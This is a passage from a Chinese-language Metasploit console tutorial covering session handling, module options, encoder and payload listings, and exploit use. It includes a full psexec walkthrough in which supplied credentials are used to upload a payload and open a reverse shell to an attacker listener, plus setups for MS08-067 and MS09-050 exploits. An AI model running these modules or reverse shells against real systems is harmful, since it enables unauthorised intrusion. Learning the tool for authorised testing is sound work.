‘sessions’允许你列举，使用，杀掉已有的会话。会话可以是 shells，Meterreter，VNC 等. 
msf > sessions -h 
Usage: sessions [options] 
Active session manipulation and interaction. 
OPTIONS: 
    -K        关闭所有会话 
    -c   使用-i 指定某个会话执行这个命令, 
    -d   从一个交互式的会话中分离出来 
    -h        打印帮助信息 
    -i   指定 ID 进入会话 
    -k   关闭某个会话 
    -l        列举所有活动的会话 
    -q        静默模式 
    -r        重置-i 指定会话对应的 the ring 缓冲区, 或所有的 
    -s   对-i 会话执行脚本, 或所有 
    -u   将 shell 转为 Meterpreter 会话 
    -v        查看详细信息 
set 
‘set’命令允许你配置 Framework 当前模块的选项和参数. 
msf > use multi/handler 
msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp 
msf  exploit(handler) > set LHOST 192.168.100.137 
LHOST => 192.168.100.137 
msf  exploit(handler) > show options 
Metasploit 允许你在执行 exploit 的时候设定一个编码器，在溢出代码开发过程中，你不确定
哪个编码器对溢出代码有效时，这个就非常有用。 
msf  exploit(ms09_050_smb2_negotiate_func_index) > show encoders 
Compatible Encoders 
=================== 
   Name                    Disclosure Date  Rank       Description 
   ----                    ---------------  ----       ----------- 
   generic/none                             normal     The "none" Encoder 
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder 
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder 
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower 
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder 
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder 
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder 
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder 
   x86/countdown                            normal     Single-byte XOR Countdown Encoder 
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder 
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder 
   x86/nonalpha                             low        Non-Alpha Encoder 
   x86/nonupper                             low        Non-Upper Encoder 
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder 
   x86/single_static_bit                    manual     Single Static Bit 
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder 
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder 
unset 
’unset’与’set’命令相反，用于解除’set’先前的设定。可以使用’unset all’来移除所有已
声明的变量。 
msf > set RHOSTS 192.168.1.0/24 
RHOSTS => 192.168.1.0/24 
msf > set THREADS 50 
THREADS => 50 
msf > set 
Global 
====== 
  Name     Value 
  ----     ----- 
  RHOSTS   192.168.1.0/24 
  THREADS  50 
msf > unset THREADS 
Unsetting THREADS... 
msf > unset all 
Flushing datastore... 
msf > set 
Global 
====== 
No entries in data store. 
msf >  
setg 
如果想要保存渗透过程中输入的内容，你可以使用 setg 设置全局变量，一旦设置，将在众多的
exploits 和 auxiliary 模块中生效。你可以使用’save’命令保存设置，，以便下次开启
msfconsole 时直接生效。 
msf > setg LHOST 192.168.1.101 
LHOST => 192.168.1.101 
msf > setg RHOSTS 192.168.1.0/24 
RHOSTS => 192.168.1.0/24 
msf > setg RHOST 192.168.1.136 
RHOST => 192.168.1.136 
msf > save 
Saved configuration to: /root/.msf3/config 
msf > 
show 
在 msfconsole 窗口输入’show’命令，可以查看 Metasploit 的每个模块. 
Show 可查阅的模块类型有 all, encoders, nops, exploits, auxiliary， 
exploits， plugins, options.模块参数也可以查看，例如:advanced, evasion, 
targets, actions. 
show payloads 
msf > show payloads 
Payloads 
======== 
   Name                                             Disclosure Date  Rank    Description 
   ----                                             ---------------  ----    ----------- 
   aix/ppc/shell_bind_tcp                                            normal  AIX Command Shell, Bind TCP Inline 
   aix/ppc/shell_find_port                                           normal  AIX Command Shell, Find Port Inline 
   aix/ppc/shell_interact                                            normal  AIX execve shell for inetd 
msf > use windows/smb/ms08_067_netapi 
msf  exploit(ms08_067_netapi) > show payloads 
show options 
msf > use windows/smb/ms08_067_netapi 
msf  exploit(ms08_067_netapi) > show options 
show targets 
msf > use windows/smb/ms08_067_netapi 
msf  exploit(ms08_067_netapi) > show targets 
Exploit targets: 
   Id  Name 
   --  ---- 
   0   Automatic Targeting 
   1   Windows 2000 Universal 
   10  Windows 2003 SP1 Japanese (NO NX) 
   11  Windows 2003 SP2 English (NO NX) 
   12  Windows 2003 SP2 English (NX) 
...snip... 
show advanced 
msf exploit(ms08_067_netapi) > show advanced 
Module advanced options: 
   Name           : CHOST 
   Current Setting: 
   Description    : The local client address 
   Name           : CPORT 
   Current Setting: 
   Description    : The local client port 
...snip... 
encoders 
’show encoders’显示 MSF 内置可用的编码器. 
msf > show encoders 
Compatible Encoders 
=================== 
   Name                    Disclosure Date  Rank       Description 
   ----                    ---------------  ----       ----------- 
   cmd/generic_sh                           good       Generic Shell Variable Substitution Command Encoder 
     cmd/ifs                                  low        Generic ${IFS} Substitution Command Encoder 
     cmd/printf_php_mq                        manual     printf(1) via PHP magic_quotes Utility Command Encoder 
     generic/none                             normal     The "none" Encoder 
     mipsbe/longxor                           normal     XOR Encoder 
     mipsle/longxor                           normal     XOR Encoder 
     php/base64                               great      PHP Base64 encoder 
     ppc/longxor                              normal     PPC LongXOR Encoder 
     ppc/longxor_tag                          normal     PPC LongXOR Encoder 
     sparc/longxor_tag                        normal     SPARC DWORD XOR Encoder 
     x64/xor                                  normal     XOR Encoder 
     x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder 
     x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder 
     x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower 
     x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder 
     x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder 
     x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder 
     x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder 
     x86/countdown                            normal     Single-byte XOR Countdown Encoder 
     x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder 
     x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder 
     x86/nonalpha                             low        Non-Alpha Encoder 
     x86/nonupper                             low        Non-Upper Encoder 
     x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder 
     x86/single_static_bit                    manual     Single Static Bit 
     x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder 
     x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder 
nops 
’show nops’显示 Metasploit 可用 NOP 生成器. 
msf > show nops 
NOP Generators 
============== 
   Name             Disclosure Date  Rank    Description 
   ----             ---------------  ----    ----------- 
   armle/simple                      normal  Simple 
   php/generic                       normal  PHP Nop Generator 
   ppc/simple                        normal  Simple 
   sparc/random                      normal  SPARC NOP generator 
   tty/generic                       normal  TTY Nop Generator 
   x64/simple                        normal  Simple 
   x86/opty2                         normal  Opty2 
   x86/single_byte                   normal  Single Byte 
use 
当你决定启用某个模块时，可以使用’use’命令选择所需模块.’use’命令可以完成一个模块向另
一个模块的切换.注意先前设置的全局变量对模块的影响. 
Exploits 
Metasploit 框架中的 exploits 可以分为两类： 主动型与被动型 
主动型 exploits 
主动型能够直接溢出特定主机. 
暴力破解模块成功从受害者机器获得一个 shell 后，就会退出. 
如果在执行过程中遇到错误，模块也会停止运行. 
可以使用’-j’让一个模块在后台运行. 
msf exploit(ms08_067_netapi) > exploit -j 
[*] Exploit running as background job. 
msf exploit(ms08_067_netapi) > 
例如: 
可以通过一组有效的证书(明文密码或者 hash)，从目标机获取一个反弹 shell. 
msf > use exploit/windows/smb/psexec 
msf exploit(psexec) > set RHOST 192.168.1.100 
RHOST => 192.168.1.100 
msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp 
PAYLOAD => windows/shell/reverse_tcp 
msf exploit(psexec) > set LHOST 192.168.1.5 
LHOST => 192.168.1.5 
msf exploit(psexec) > set LPORT 4444 
LPORT => 4444 
msf exploit(psexec) > set SMBUSER victim 
SMBUSER => victim 
msf exploit(psexec) > set SMBPASS s3cr3t 
SMBPASS => s3cr3t 
msf exploit(psexec) > exploit 
[*] Connecting to the server... 
[*] Started reverse handler 
[*] Authenticating as user 'victim'... 
[*] Uploading payload... 
[*] Created \hikmEeEM.exe... 
[*] Binding to 367abb81-9844-35f1-ad32-
98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ... 
[*] Bound to 367abb81-9844-35f1-ad32-
98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ... 
[*] Obtaining a service manager handle... 
[*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")... 
[*] Closing service handle... 
[*] Opening service... 
[*] Starting the service... 
[*] Removing the service... 
[*] Closing service handle... 
[*] Deleting \hikmEeEM.exe... 
[*] Sending stage (240 bytes) 
[*] Command shell session 1 opened (192.168.1.5:4444 -> 
192.168.1.100:1073) 
Microsoft Windows XP [Version 5.1.2600] 
(C) Copyright 1985-2001 Microsoft Corp. 
C:\WINDOWS\system32> 
注意: 如果溢出失败，出现下面错误， 
[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode 
引起的原因，可能有: 
UAC 安全设置 
此溢出方法无效，可选用其他方法. 
被动型 exploits 
被动型 exploits，等待主机连接并对他进行溢出. 
被动型 exploits 常见于浏览器，FTP 这样的客户端工具等. 
被动型 exploits 可以用邮件发出去，等待连入. 
查看被动型 exploits 建立的会话，可以使用’sessions -l’，使用’-i’可以进入指定
的 shell 会话 
msf exploit(ani_loadimage_chunksize) > sessions -l 
Active sessions 
=============== 
  Id  Description  Tunnel 
  --  -----------  ------ 
  1   Meterpreter  192.168.1.5:52647 -> 192.168.1.100:4444 
msf exploit(ani_loadimage_chunksize) > sessions -i 1 
[*] Starting interaction with 1... 
meterpreter > 
Using Exploits 
如果想为一个 exploit 添加额外设置，可以使用’show’命令查看选项内容 
Targets 
msf exploit(ms09_050_smb2_negotiate_func_index) > show targets 
Exploit targets: 
   Id  Name 
   --  ---- 
   0   Windows Vista SP1/SP2 and Server 2008 (x86) 
Payloads 
msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads 
Compatible Payloads 
=================== 
   Name                              Disclosure Date  Rank    Description 
   ----                              ---------------  ----    ----------- 
   generic/custom                                     normal  Custom Payload 
   generic/debug_trap                                 normal  Generic x86 Debug Trap 
   generic/shell_bind_tcp                             normal  Generic Command Shell, Bind TCP Inline 
   generic/shell_reverse_tcp                          normal  Generic Command Shell, Reverse TCP 
Inline 
   generic/tight_loop                                 normal  Generic x86 Tight Loop 
   windows/adduser                                    normal  Windows Execute net user /ADD 
...snip... 
Options 
msf exploit(ms09_050_smb2_negotiate_func_index) > show options 
Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index): 
   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   RHOST                   yes       The target address 
   RPORT  445              yes       The target port 
   WAIT   180              yes       The number of seconds to wait for 
the attack to complete. 
Exploit target: 
   Id  Name 
   --  ---- 
   0   Windows Vista SP1/SP2 and Server 2008 (x86) 
Advanced 
msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced 
Module advanced options: 
   Name           : CHOST 
   Current Setting: 
   Description    : The local client address 
   Name           : CPORT 
   Current Setting: 